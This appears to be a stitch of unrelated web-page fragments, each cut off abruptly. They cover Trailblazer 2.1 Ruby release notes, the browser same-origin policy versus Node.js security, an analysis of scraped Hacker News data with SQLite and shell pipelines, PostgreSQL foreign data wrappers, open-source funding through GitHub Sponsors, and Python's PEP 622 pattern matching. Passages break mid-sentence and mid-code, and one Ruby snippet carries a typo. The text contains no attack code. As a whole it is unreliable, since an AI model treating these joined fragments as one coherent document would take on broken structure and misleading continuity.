<p>A lot of work went into the <code>dsl-linear</code> gem that provides a DSL to create activities (or operations) using your old friend <code>#step</code>. It’s not even a DSL since it doesn’t create code at run-time, it doesn’t even create code: it creates runtime objects, <em>activities</em>, that are executed when your operation is run. You could create those objects manually without the DSL, or even write your own DSL, which we’re hoping for!</p>

<p>So, whenever you hear the medieval argument “Trailblazer is just a nasty DSL!”, forgive your opponent, you now know better. The entire framework is based on small, clean Ruby structures that can be executed programmatically.</p>

<p>Also, the more I <em>use</em> Trailblazer in projects or even in Trailblazer itself, I feel how needed those new abstractions are. Yes, you can write everything with your own code, you don’t need abstractions for flow control and automatic error handling, which makes me wonder why you’re not programming in assembler since Ruby is also an “unnecessary abstraction” on top of a processor. We need abstractions, unless you want to program like we did 30 years ago.</p>

<p>Ok, enough of this - let’s jump into the things that actually help you.</p>



<h3 id="blog-official-2-1-release-notes-loader-startup-speed">Loader / Startup Speed</h3>


<p>Startup speed and loading of operations has been a never-ending problem.</p>

<p>To make it short: we returned to the <em>Rails Way™</em>, lowering our heads in shame, and adhere to the Rails file and class naming structure for <em>operations</em>. What used to be named <code>Memo::Create</code> is now <code>Memo::Operation::Create</code>, which reflects its file location <code>concepts/memo/operation/create.rb</code> (still the same!) and works with Rails’ autoloading.</p>

<p>The big benefit is: we could remove the <code>trailblazer-loader</code> gem. The alternative loader was a naive attempt by me to combine “our” naming style with the Rails file structure. After endless fire-fighting against broken development reloading, inconsistencies, slow startup times in develpment mode, more incompatibilities with Rails’ autoloader and some clarifying discussions with the great <a href="https://github.com/fxn">Xavier Noria</a> himself (author of Rails loading and zeitwerk), we ditched our loading mechanism.</p>

<p>If you want to take advantage of the fast server startup times and (almost) seamless hot reloading of classes, you need to <a href="https://trailblazer.to/2.1/docs/trailblazer.html#trailblazer-rails-loader-loader-with-rails">rename your operations</a>.</p>

<p>This change is not super dramatic at all, given that in the future, you won’t be calling operations yourself all too much anymore. With the upcoming <code>workflow</code> and <code>endpoint</code> gems, those abstractions will invoke the business logic for you, so don’t worry too much.</p>



<h3 id="blog-official-2-1-release-notes-new-website">New website</h3>


<p>In case you haven’t noticed: you are reading this release blog post on a newly designed website! Not only does it come with the most beautiful, romantic and inspiring <a href="https://trailblazer.to/2.1/">hero backdrop ever</a> (featuring a James-Cameron-worthy parallax effect, too!), it also attempts to provide all the old documentation while bringing you the hottest off-the-press docs for our new gems.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-lp-hero.png"></p>

<p>We try to keep the “information architecture” - a word I wouldn’t have learned without the inspiring <a href="https://github.com/myabc">Alex Coles</a> - as simple as possible: so far, we got a handful of pages accessible through the top navigation, and then the documentation behind the <a href="https://trailblazer.to/2.1/2.1/docs/trailblazer.html">DOCS</a> link. Here, the right sidebar helps you to navigate within the chapter.</p>

<p><img src="https://trailblazer.to/images//2.1/blog-documentation.png"></p>

<p>After all, we’re a nerdy developer’s library and don’t need no million hipster landing pages! One is more than enough and took months of collaboration between us, the design and web team in Argentina and our awesome comic artist <a href="http://www.joshbauman.com/">Josh Bauman</a> who also drew the epic <a href="https://leanpub.com/trailblazer">Trailblazer book</a> illustrations in 2016.</p>

<p>The documentation has been designed to make coherent information as quickly accessible as possible. We even added a search feature - something our beloved user base has asked for many times. Just hit the <code>/</code> key (or <code>Shift+7</code>) in the docs.</p>



<h3 id="blog-official-2-1-release-notes-api-changes">API CHANGES</h3>


<p>The new 2.1 version comes with a few necessary but reasonable changes in method signatures. As painful as that might sound to your Rails-spoiled ears, we preferred to fix design mistakes now before dragging them on forever.</p>



<ul>
    <li>API CHANGES</li>
    <li id="blog-official-2-1-release-notes-api-changes-new-call-api">New call API</li>
</ul>

<p>In versions before 2.1, the automatic merging of the <code>params</code> part and the additional options was confusing many new users and an unnecessary step.</p>

<pre><code># old style
result = Memo::Create.(params, "current_user" =&gt; current_user)
</code></pre>

<p>The first argument (<code>params</code>) was merged into the second argument using the key <code>"params"</code>. You now pass one hash to <code>call</code> and hence do the merging yourself.</p>

<pre><code># new style
result = Memo::Operation::Create.(params: params, current_user: current_use )
</code></pre>

<p>Your steps use the existing API, and everything here is as it used to be before.</p>

<pre><code>class Memo::Operation::Create &lt; Trailblazer::Operation
  step :create_model

  def create_model(options, params:, **)
    # ..
  end
end
</code></pre>

<p>The new <code>call</code> API is much more consistent and takes away another thing we kept explaining to new users - an indicator for a flawed API. Believe it or not, but not a single time has this topic come up again on our <a href="https://trailblazer.zulipchat.com/">support forum</a>.</p>



<ul>
    <li>API CHANGES</li>
    <li id="blog-official-2-1-release-notes-api-changes-symbol-keys-for-ctx">Symbol keys for ctx</li>
</ul>

<p>The <code>ctx</code> (or <code>options</code>) object now behaves like a <code>HashWithIndifferentAccess</code>, a pattern used for Rails’ <code>params</code> object. In other words, you can now access <code>ctx[:current_user]</code> instead of <code>ctx["current_user"]</code> and conveniently use the keyword argument version of it, too.</p>

<p>Another handy addition to <code>ctx</code> is aliasing. Before 2.1, you had to refer to, say, the main contract via <code>ctx["contract.default"]</code>. While I designed that name “back in the …</p></div></div></div></div></div>

JavaScript code downloaded from multiple different sites is executed in the same browser.</p><p>One of those sites could be infected or operated by an attacker. Is this a risk? Could malicious code compromise the machine or steal data from other sites the user is browsing?</p><p>Browsers protect against this. Each Web site executes JavaScript code in a sandbox. Code downloaded from one Web site cannot read or write data from another site. It also cannot call functions or methods across different sites.</p><p>This is called the <a href="https://web.dev/same-origin-policy/">Same-origin policy</a> (SOP) and it is one of the most fundamental security policies on the Web.</p><h2 id="protecting-code-integrity">Protecting Code Integrity</h2><p>Attackers could breach the SOP through the injection of malicious code at the network level, making the injected code appear as coming from the legitimate site. Browsers use the <a href="https://web.dev/why-https-matters/">secure HTTPS protocol</a> to ensure JavaScript code is downloaded from the legitimate server and that the code is not tampered with in transit.</p><p>JavaScript is often distributed using Content Delivery Networks (CDN). Attackers capable of injecting content into the CDN could also compromise the SOP. <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a> (SRI) provides an additional level of protection that allows HTML code to be cryptographically bound to JavaScript code to prevent this.</p><p>Sandboxing is difficult to implement. Browsers use isolation mechanisms provided by the hardware and the operating system. JavaScript code from different sites is executed in separate processes.</p><p>The code in a sandbox is restricted in what it can do. It cannot directly access devices such as webcams or microphones. The filesystem and the local network are also not directly available.</p><p>JavaScript can use those resources only through very limited APIs. This reduces the attack surface. It also allows the browser to always ask the user for explicit permission before uploading files, capturing the webcam, or listening to the user’s microphone.</p><p>Node.js is a runtime environment for JavaScript based on the V8 engine built for the Google Chrome browser. It allows JavaScript code to be executed outside of the browser, typically on servers.</p><p>Node.js does not use the browser sandbox to run JavaScript. Security properties of both execution environments are different:</p><ul><li><strong>Origin</strong>. Browsers download the code and Node.js loads the code from local files like other popular programming languages.</li><li><strong>Trust</strong>. Browsers treat the code as untrusted and Node.js treats the code with full trust.</li><li><strong>Permissions</strong>. Browsers restrict capabilities the code has access to and Node.js grants all the privileges of the operating system account. This includes access to devices, files, and the local network.<br>Impact on Security</li></ul><p>The same JavaScript script or module can be executed in the browser or Node.js. Potential attacks may be different in both environments. The impact of successful exploits may be drastically different. It is very hard to reason about the security of JavaScript code without a specific execution environment in mind.</p><h2 id="browsers">Browsers</h2><p>A successful attack on JavaScript code running in the browser impacts a single user. The impact is limited to what the sandbox, browser APIs, and the user’s explicit consent allow for.</p><p>Compromised JavaScript script or module runs within the context of an authenticated session of the victim and it can perform actions on behalf of the user. In this scenario, the vulnerable code becomes an attack vector against Web applications the victim has legitimate access to.</p><h2 id="node-js">Node.js</h2><p>A successful attack on Node.js programs may impact the entire server the program runs on.

<p><img alt="preview" src="https://abetusk.github.io/yahnda/img/preview.png"></p>
<h6 id="2020-07-02">2020-07-02</h6>
<h2 id="introduction">Introduction</h2>
<p>Here I will do some basic analysis of the data provided by 
Y-Combinator's social news site, <a href="https://news.ycombinator.com/">Hacker News</a> (HN).
The analysis presented here is a light hearted meandering through different
aspects of the HN site data.
I've favored an approach that leaves the data interpretation up to the reader
and kept my own interpretation to a minimum.</p>
<p>Doing a search for a snapshot of the HN API data provided some options but nothing
recent and nothing with user information also present, at least, not that I could find.
I decided to scrape what was available from the HN data through their very
nice <a href="https://github.com/HackerNews/API">API</a> and do some rudimentary analysis.</p>
<p>To get a copy of the database to play around with yourself, a snapshot
has been provided as a SQLite file along with the compressed 'raw' JSON files on <a href="https://archive.org/details/HackerNews-Data-2020-06-28">Archive.org</a>.
The raw data is about 3.6Gb compressed and the SQLite file is 5G compressed and 13G uncompressed.</p>
<p>All source code, unless otherwise stated, as well as text and other data, is provided
under a CC0/public domain license.
The Hacker News itself is proprietary and so please check with with the
<a href="https://www.ycombinator.com/legal/#tou">Terms of Use</a>.
I am, no doubt, violating their terms of use so I'm hoping they won't sue me
or take down the data as I'm providing it in the hacker friendly spirit of
data sharing and transparency.</p>
<p>There's nothing novel here, aside, maybe, from an easily downloadable database.</p>
<p>That being said, I imagine a lot of people thinking "so what?" and I'd be hard pressed
to argue with them.</p>
<p>So what? So what! Why not! Let's take a look at Hacker News data!</p>
<h2 id="analysis">Analysis</h2>
<h3 id="overview">Overview</h3>
<p>First let's get an overview of the data:</p>
<pre><code>sqlite&gt; select count(*) from users;
558905
sqlite&gt; select count(*) from item;
23669105
</code></pre>

<p>A breakdown of different types of item data:</p>
<pre><code>sqlite&gt; select count(id), type from item group by type ;
count(id)|type
19882923|comment
13014|job
1788|poll

3759216|story
</code></pre>

<p><img alt="submission type" src="https://abetusk.github.io/yahnda/img/overview.png"></p>
<p>Please note the frequency log-scale.</p>
<hr>
<p>Different item data, grouped by month, through time:</p>
<pre><code>sqlite&gt; select count(id), type, substr(datetime(time, 'unixepoch', 'localtime'), 0, 8) mo  from item group by mo, type order by mo asc;

<p><img alt="type vs time" src="https://abetusk.github.io/yahnda/img/type-mo-ts.png"></p>
<h4 id="user-item-frequency">User Item Frequency</h4>
<p>How about the frequency of user item creating (polls, comments, stories, etc.), making sure to filter out blank <code>by</code> fields:</p>
<pre><code>sqlite&gt; select count(id) c, by from item where by != '' group by by order by c desc;
c|by
51639|tptacek
40333|jacquesm
39999|dang
34255|rbanffy
33216|dragonwriter
31837|pjmlp
25573|coldtea
24766|TeMPOraL
24666|DanBC
22665|icebraining
...
</code></pre>

<p>Either because my SQL knowledge is substandard or I don't know what I'm doing with the indexes, I found queries took too long in SQL.
Parsing the JSON directly yields faster results for me.</p>
<p>After some data munging, we get: </p>
<pre><code>zcat $datadir/hn-item*.ajson.gz | \
  jq -r -c '.by ' | \
  grep -P -v '^$' | \
  grep -P -v '^null$' | \
  sort | \
  uniq -c | \
  sort -nr | \
  sed 's/^ *//' &gt; user_item_freq.gp
cut -f1 -d' ' user_item_freq.gp | \
  sort | \
  uniq -c | \
  sort -nr | \
  sed 's/^ *//'  | \
  awk '{ print $2, $1; }' &gt; user_item_freq_freq.gp
./zipf-mle user_item_freq.gp &gt; user_item-exponent-mle.txt
</code></pre>

<p>Looking at a log-log plot of the graph:</p>
<p><img alt="user item frequency" src="https://abetusk.github.io/yahnda/img/user-item-freq.png"></p>
<p>Ah! The tell-tale sign of a power law distribution.</p>
<p>Here it is broken out by <code>story</code> and <code>comment</code> items:</p>
<p><img alt="user story/comment frequency" src="https://abetusk.github.io/yahnda/img/sc-freq.png"></p>
<p>The y-axis being the number of users which have that frequency of item creation and the x-axis is the number of
items created.
For example, you can see <code>tptacek</code> far out on the right, being the only user to have 51639 items created, whereas
users that only have 1 comment, say, are much more frequent.
For context, I'm at 224 item creation (comments and stories combined) and fall in the middle.</p>
<p>Thanks to <a href="https://www.johndcook.com/blog/2015/11/24/estimating-the-exponent-of-discrete-power-law-data/">John D. Cook</a> we can copy-pasta
the maximum likelihood estimator (MLE) code to give us a value of 1.58 for the exponent for all items, 1.54 for comments and 1.77 for stories.
As <a href="https://en.wikipedia.org/wiki/Stable_distribution">a sanity check</a>, they all fall in the range of <code>(1,3)</code>, which is expected
for fat-tailed distributions.</p>
<p>What does it mean? I dunno <code>-\_(:|)_/-</code></p>
<h4 id="user-urls">User URLs</h4>
<p>Let's take a look at the common URLs in the <code>about</code> field from the users on HN.
Getting URLs from the <code>about</code> field in the <code>users</code> table is difficult to do in vanilla SQLite3 syntax, so excuse
the bash incantation:</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo 'select about from users where about like "%https:%";' ) | \
  sed 's/&amp;#x2F;/\//g' | \
  grep -o -P 'https?://[a-zA-Z0-9\.-]*' | \
  sort | \
  uniq -c | \
  sort -rn 
</code></pre>

<p><img alt="User URLs" src="https://abetusk.github.io/yahnda/img/user-url.png"></p>
<p>Please note the log-scale of frequency.</p>
<p>One thing that jumps out is the prevalence of <code>keybase.io</code>.
I can only assume that Y-Combinator has some close relationship to <code>keybase.io</code>, maybe going to far as
insisting folks going through their program use it.</p>
<p>Another point of note is the high occurrence of sites like <code>hackernewsers.com</code>.
An unkind interpretation would be that some folks are trying to game the HN system
to give a signal boost to their site.</p>
<p>Note that this analysis counts subdomains as separate URLs.
I don't want to get too far into the weeds with this analysis but your own
could include better handling and binning of URLs like <code>github.io</code> or <code>tumblr.com</code> sites.</p>
<h4 id="item-frequency-by-time">Item Frequency by Time</h4>
<p>Let's start with looking at activity of stories and comments during the day.
So we're not deluged by extraneous data, let's just take data from Jan 1st 2020 (unixtime <code>1577854800</code>):</p>
<pre><code>echo 'select substr(datetime(time, "unixepoch", "utc"), 12, 5) t from item where time &gt;= 1577854800 and time != "" ;' | \
  sqlite3 hn.sqlite | \
  tr ':' ' ' | \
  awk '{ print ($1 &lt; 10)? ($1+24 + $2/(60)) : ($1+$2/60), $3; }' | \
  sort -n 
</code></pre>

<p><img alt="UTC Time of Day Item" src="https://abetusk.github.io/yahnda/img/item-tod-unshifted.png"></p>
<p>Whoa! Seems like a pretty clear signal.</p>
<p>Let's shift so we see the trend with a bit more clarity:</p>
<pre><code>echo 'select substr(datetime(time, "unixepoch", "utc"), 12, 5) t from item where time &gt;= 1577854800 and time != "" ;' | \
  sqlite3 hn.sqlite | \
  tr ':' ' ' | \
  awk '{ print ($1 &lt; 10)? ($1+24 + $2/(60)) : ($1+$2/60), $3; }' | \
  sort -n 
</code></pre>

<p><img alt="UTC Time of Day Item shifted" src="https://abetusk.github.io/yahnda/img/item-tod.png"></p>
<p>16:00 UTC is 09:00 AM PT, so I would guess HN is pretty (US) west coast centric with the majority of activity happening
at the start of the business day.</p>
<p>I wouldn't guess any big surprises, but let's split it out by stories and comments:</p>
<p><img alt="UTC story and comment ToD" src="https://abetusk.github.io/yahnda/img/sc-tod.png"></p>
<p>Note that the story submissions are much less prevalent than comments and are plotted with different Y axies.</p>
<p>It should be obvious but I only realized this in retrospect from looking at the data that comments have a lag
behind stories, for probably obvious reasons.</p>
<hr>
<p>Let's see if we can pick out any weekend effects.</p>
<pre><code>echo -e '.separator " "\nselect strftime("%w", datetime(time, "unixepoch", "utc")), substr(datetime(time, "unixepoch", "utc"), 12, 5), type from item where time &gt; 1577854800 and time != "";' | \
  sqlite3 hn.sqlite &gt; item-tow.raw
grep -P ' (comment|story)$' item-tow.raw | \
  cut -f1,2 -d' ' | \
  sort  | \
  uniq -c | \
  sed 's/^ *//' | \
  tr ':' ' ' | \
  awk '{ print $2 + ($3/24) + ($4/(24*60)), $1; }' | \
  sort -n
</code></pre>

<p><img alt="item time of week" src="https://abetusk.github.io/yahnda/img/item-tow.png"></p>
<p>Again, no big surprises.</p>
<p>Here, 0 is Sunday and 6 is Saturday (the results of using <code>%w</code> in <code>strftime</code>) and times are in UTC properly rescaled.</p>
<p>I would guess most people interact with HN during the weekday and peter off on the weekends, with Sunday being the least active day.</p>
<h4 id="story-word-clouds">Story Word Clouds</h4>
<p>Let's look at a trigram word cloud for stories in 2019 and 2020 (so far):</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != '' and substr(datetime(time, 'unixepoch', 'utc'), 1,4) = '2019' and time &gt;= 1546318800 order by id desc;" ) | \
  ./trigrams | \
  iconv -f utf-8 -t ascii//translit | \
  tr ',-.:!'"'"'"' '_'  &gt; 2019-filtered.trigrams
./plot-wordcloud 2019-filtered.trigrams hn-2019-trigram.png
sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != '' and substr(datetime(time, 'unixepoch', 'utc'), 1,4) = '2020' and time &gt;= 1577854800 order by id desc;" ) | \
  ./trigrams | \
  iconv -f utf-8 -t ascii//translit | \
  tr ',-.:!'"'"'"' '_'  &gt; 2020-filtered.trigrams
./plot-wordcloud 2020-filtered.trigrams hn-2020-trigram.png
</code></pre>

<p>2019:</p>
<p><img alt="HN 2019 Trigrams" src="https://abetusk.github.io/yahnda/img/hn-2019-trigram.png"> </p>
<p>2020 (so far):</p>
<p><img alt="HN 2020 Trigrams" src="https://abetusk.github.io/yahnda/img/hn-2020-trigram.png"></p>
<p>Please excuse the underscores I'm being lazy and constructing "single" words by concatenating three words together
to fool <a href="https://github.com/amueller/word_cloud/">amueller/word_cloud</a> into constructing the word cloud.</p>
<p>Note that these are for stories that have a score of more than 30.
The mangling of the title might also have an effect, so take care to not read too much into the word cloud.
Also note that I don't think there's a way to really get at what stories were on the front page with this data
so that might skew interpretation.</p>
<p>You can also see some topical subjects from 2019, like the Hong Kong protests, the Boeing 737 and Raspberry Pi 4.
I guess the take away is there's a lot of 'ask' and 'show' stories that are popular.
I would interpret this as the community tends to like posts that they can actively engage in.
It'll be a cute meta-analysis to see if this post lands on the front page of HN ;).</p>
<p>I picked tri-grams pretty arbitrarily.
Single words and bi-grams don't really provide enough information to be interesting to me.
Tri-grams look to have just enough interesting information to at least give the illusion
of insight before being drowned out by the combinatorial explosion of choices.</p>
<h4 id="story-topic-modeling">Story Topic Modeling</h4>
<p>Engaging in some more tea leaf reading, we can do some <a href="http://mallet.cs.umass.edu/topics.php">topic modeling</a>.
Topic modelling is new to me but I discovered it
from the excellent <a href="https://greg.blog/2013/01/26/unix-bi-grams-tri-grams-and-topic-modeling/">blog post on using UNIX for Bi/Tri-Grams</a>.</p>
<p>Running a query against 2020 HN stories (so far):</p>
<pre><code>sqlite3 hn.sqlite &lt; &lt;( echo "select title  from item where type = 'story' and score &gt; 30 and score != ''  and time &gt;= 1546318800 and time &lt;= 1609477200; " ) &gt; hn-story-2020.txt

</span></code></pre></section></section><section><h2 id="what-are-foreign-data-wrappers">What are foreign data wrappers?</h2><p>The easiest way to describe foreign data wrappers is by considering UNIX files. A UNIX file isn't always pointing to a local file on your disk. It could be a file stored on NFS, in a remote S3 bucket or even a shim that lets you manipulate a device on your machine.</p><p>In UNIX, a file is a pretty strong abstraction that doesn't get broken. An IDE doesn't need to know that the file it's editing is on a remote filesystem. It can work with it by issuing the same ordinary read and write calls. Someone who writes a new filesystem doesn't need to make sure that it's compatible with all existing tools. Instead, they can write a driver that mounts the filesystem to a mountpoint.</p><p>PostgreSQL FDWs resemble mounting in that respect. Foreign tables mostly behave like normal tables and can receive the same <code>SELECT/INSERT/UPDATE/DELETE</code> queries. Behind the scenes, the wrapper's only job is to emit tuples.</p></section><section><h2 id="why-should-i-use-fdws">Why should I use FDWs?</h2><p>Foreign data wrappers are a great alternative to ETL. Instead of loading data into your warehouse that you might never use, you can mount the remote database and query it on demand.</p><p>Because they integrate with the PostgreSQL query planner, FDWs have a decent performance. The FDW can push down qualifiers and even aggregations to the remote database. FDWs can report the rough costs of starting a scan and fetching a tuple back to the query planner. This lets the query planner choose, for example, whether running multiple small single scans or one big one is a better strategy for satisfying a JOIN.</p><p>It's straightforward to write your own FDW and the <a href="https://www.postgresql.org/docs/12/fdwhandler.html" as="https://www.postgresql.org/docs/12/fdwhandler.html">PostgreSQL documentation</a> covers it extensively. The <a href="https://github.com/wikrsh/hello_fdw/" as="https://github.com/wikrsh/hello_fdw/">hello-world FDW</a> that returns "Hello, World" in a table is only a couple hundred lines of C code. If you prefer to focus on development simplicity, you can use Multicorn instead of raw C.</p><p>There are plenty of open-source foreign data wrappers available. They let you query other RDBMSs, NoSQL databases, CSV files or column stores. The <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers" as="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">PostgreSQL wiki</a> lists some of them.</p><p>Using a foreign data wrapper for your database or data source gives you access to a huge ecosystem of software that works with PostgreSQL. We can almost call this a network effect. A new data source that is accessible via an FDW enhances everything that works with PostgreSQL.</p></section><section><h2 id="why-use-fdws-with-splitgraph">Why use FDWs with Splitgraph?</h2><p><a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction">Foreign data wrappers</a> are one of the ways that Splitgraph aims to make data engineers' and data scientists' work easier.</p><p>Splitgraph's <a href="https://www.splitgraph.com/docs/sgr/data-import-export/mount" as="https://www.splitgraph.com/docs/sgr/data-import-export/mount"><code>sgr mount</code></a> command handles the boilerplate around FDW initialization.

    <div>
      
      
      
      <p>Recently I received an invite to the GitHub Sponsors program so I figured I’d make a sponsorship page. Building <a href="https://github.com/users/giuseppeg/sponsorship">my sponsorship profile</a> was fun!</p>

<figure>
<img src="https://user-images.githubusercontent.com/711311/66648695-78bed800-ec2c-11e9-8cf3-6a46c5bd3511.jpeg" alt="">
<figcaption>My Sponsorship Profile.</figcaption>
</figure>

<p>Having to define dontation tiers was an interesting exercise because I had to figure out reasons that would convince (will they?) people that the donation is worth it somehow. What can I offer in my spare time? What are supporters getting in return? Is it valuable?</p>

<h2 id="will-it-work">Will it work?</h2>

<p>Getting people to donate is a very hard thing to do, and it is definitely harder for those who are no influencers because they lack visibility.</p>

<p>Not to mention that asking for a donation feels a bit like asking strangers on the street for money, maybe for a service that you deliver to somebody else. 🙃</p>

<p><del>Overall, I have a job and I am lucky enough to not have to rely on OSS funding to make a living</del>. <a href="https://giuseppegurgone.com/hire-me">I am available for hire</a>. I work on side projects and OSS at random times and for fun, so much so that I started a (very WIP) personal <a href="https://github.com/giuseppeg/contributing">Open Source Contributor Manifesto and Policies</a> to communicate this to others.</p>

<p>If you want to pursuit the OSS funding path my recommendation would be to invest in personal branding first.</p>

<div>
<blockquote data-conversation="none" data-link-color="#008000">
<div lang="en" dir="ltr"><p>Want to know the real answer? Marketing!</p><p>- Speak at confs<br>- Write articles<br>- Tweet tweet tweet tweet tweet</p></div>— Max Stoiber (<a href="https://twitter.com/mxstbr">@mxstbr</a>) <a href="https://twitter.com/mxstbr/status/1026334495975329793?ref_src=twsrc%5Etfw">August 6, 2018</a>
</blockquote> 
</div>

<p><strong>Update</strong> to date I have <strong>0</strong> sponsors. Clearly I haven’t worked on marketing and none of my projects is that valuable, yet I get a constant stream of issues/PRs.</p>

<h2 id="alternatives-to-donation-based-systems">Alternatives to donation-based systems</h2>

<p>GitHub Sponsors and donation based platforms are great for some, but ultimately I think that the path to OSS sustainability is to reward developers based on usage stats (installs or consumers/licenses) or provide services around OSS.</p>

<p>For example I have this tiny project that has 24k downloads a month. In this space it is nothing but nonetheless it is definitely providing value to some. How could this translate to a few bucks? 🤷‍♂️</p>

<figure>
<img src="https://user-images.githubusercontent.com/711311/66648696-78bed800-ec2c-11e9-81b2-1ba89b4cf668.png" alt="">
<figcaption>Non-profitable OSS with 24k monthly download.</figcaption>
</figure>

<h3 id="services">Services</h3>

<p>The more I observe the OSS space, the more I think that the only real way to make OSS sustainable is to build services around it and sell those instead of the software itself.</p>

<p>Focusing on providing services has proven to be working well for many companies.</p>

<p>On the other end this means that individual contributors are now required to build a business to sustain their work on the actual code and not every developer is a business person.</p>

<h3 id="paid-packages">Paid Packages</h3>

<p>A very controversial solution that I have had in mind for a while is <em>paid packages</em>.</p>

<p>Library owners could make a buck from every user of their library by integrating with a centralized service that would require customers to provide a license token (in the form of environment variable) when they install a library. When users haven’t paid for the library, the install would fail.</p>

<figure><pre><code data-lang="bash"><span>$ PAID_PACKAGES_TOKEN</span><span>=</span>123 pip <span>install</span> &lt;package-name&gt;
🔴 PAID PACKAGES: Error
   &lt;package-name&gt; is a paid package.
   In order to use it please donate <span>$1</span> a month to it.
https://paidpackages.io/support/package-name</code></pre></figure>

<p>Core members of packages (maintainers) would do revenue sharing or collect funds under an organization. Occasional contributors would either get some kind of credit or get to use the library for free.</p>

<p>You can read <a href="https://github.com/giuseppeg/paid-packages">more about this idea on GitHub</a>.</p>

<h3 id="support-and-training">Support and Training</h3>

<p>Selling support and training are probably other viable options for people who want to live off of Open Source Software. I doubt that this is a viable option for the ones who work on OSS in their spare time. The tough truth is that <strong>many OSS contributors have a full time job</strong>!</p>

<h3 id="getting-hired">Getting Hired</h3>

<p>There are companies that use and produce Open Source Software all the time. An example are ZEIT or Gatsby. Getting a job at such companies could potentially mean that you wouldn’t have to work on OSS in your spare time anymore.</p>

<h3 id="crowdfunding">Crowdfunding</h3>

<p>Starting a campaign on crowfunding sites could be a good way to boostrap FOSS development.</p>

<p>A successful example of this model is <a href="https://www.indiegogo.com/projects/prosemirror/">ProseMirror’s campaign on Indiegogo</a>. They managed to raise $50000 to support the development of the project.</p>

<h3 id="npm-inc">npm Inc.</h3>

<p>npm Inc. is in a unique position because they own the biggest and most popular package registry and because they don’t yet provide a service to package owners for monetizing their software.</p>

<p>I really hope that they are monitoring the donation based space and eventually will come up with a better solution for everybody (even the small <em>fish</em>) that is <strong>not yet another donation based platform</strong>!</p>

<p><strong>Update</strong> forget this, <a href="https://github.blog/2020-04-15-npm-has-joined-github">npm has been acquired by GitHub</a> :)</p>

<h3 id="a-success-story">A Success Story</h3>

<p>If you want to read about a success story check this out <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it">https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it</a>.</p>

<p>My takeaway from it is that eventually you end up becoming a marketer more than a developer but I guess that’s part of the game 🤷‍♂️</p>

<p><a href="https://www.python.org/dev/peps/pep-0622/">PEP 622</a> proposes adding a pattern matching construct to Python. Pattern matching allows the programmer to destructure data with a syntax that mirrors the construction syntax. The proposal brings Python in-line with many other modern programming languages, like Haskell, OCaml, and Rust. However, two features included in the proposal (or-patterns and guards) interact in a perhaps surprising way—see <a href="https://hal.inria.fr/hal-01413241/document">this paper</a> for an explanation of this interaction as it relates to OCaml, another language with both or-patterns and guards.</p>

<p>You can try out an in-progress implementation of this PEP at this fork of cpython: <a href="https://github.com/brandtbucher/cpython/tree/patma">https://github.com/brandtbucher/cpython/tree/patma</a>.</p>

<p>In the rest of this post, I’ll briefly summarize pattern matching, define or-patterns and guards, and show the surprising behavior in the context of Python.</p>

<h2 id="example-of-pattern-matching">Example of pattern matching</h2>

<p>Before the proposal, here’s how you might write a function that classifies a pair of animals according to their kind</p>

<div><div><pre><code><span>class</span> <span>Dog</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
    <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

<span>class</span> <span>Cat</span><span>:</span>
  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>age</span><span>):</span>
    <span>self</span><span>.</span><span>age</span> <span>=</span> <span>age</span>

<span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>if</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Cat</span><span>):</span>
    <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>age</span><span>))</span>
  <span>elif</span> <span>isinstance</span><span>(</span><span>pet</span><span>,</span> <span>Dog</span><span>):</span>
    <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>pet</span><span>.</span><span>name</span><span>))</span>

<span>classify</span><span>(</span><span>Dog</span><span>(</span><span>"Fido"</span><span>))</span>
<span># prints: A dog named Fido
</span>
<span>classify</span><span>(</span><span>Cat</span><span>(</span><span>3</span><span>))</span>
<span># prints: A cat that's 3 years old
</span></code></pre></div></div>

<p>Under the proposal, this is how you could write <code>classify</code>:</p>

<div><div><pre><code><span>def</span> <span>classify</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
    <span>case</span> <span>Cat</span><span>(</span><span>age</span><span>=</span><span>age</span><span>):</span>
      <span>print</span><span>(</span><span>"A cat that's {} years old"</span><span>.</span><span>format</span><span>(</span><span>age</span><span>))</span>
    <span>case</span> <span>Dog</span><span>(</span><span>name</span><span>=</span><span>name</span><span>):</span>
      <span>print</span><span>(</span><span>"A dog named {}"</span><span>.</span><span>format</span><span>(</span><span>name</span><span>))</span>
</code></pre></div></div>

<p>In other words, pattern matching allows you to inspect a piece of data and simultaneously match its shape and bind the value of its fields to variables. In the above code, <code>Cat(age=age)</code> is a <em>pattern</em> that <em>matches</em> <code>Cat</code> values, and <em>binds</em> to the variable named <code>age</code>.</p>

<p>The proposal gives an informal description of the semantics of this construct, but the informal description doesn’t explain the interaction between two of the introduced features: or-patterns, and pattern guards. As it turns out, as currently implemented, the interaction between these features is somewhat surprising, and will probably yield at least one high-scoring Stack Overflow question if this PEP ends up being accepted.</p>

<h2 id="or-patterns">Or-patterns</h2>

<p>Here is an example of an or-pattern: <code>Cat(age=3) | Dog(name="Fido")</code>. This pattern matches either three-year-old cats or dogs named Fido. In practice:</p>

<div><div><pre><code><span># I have a three-year-old cat and a dog named Fido.
# This function returns true if the pet could be mine.
</span><span>def</span> <span>couldBeMyPet</span><span>(</span><span>pet</span><span>):</span>
  <span>match</span> <span>pet</span><span>:</span>
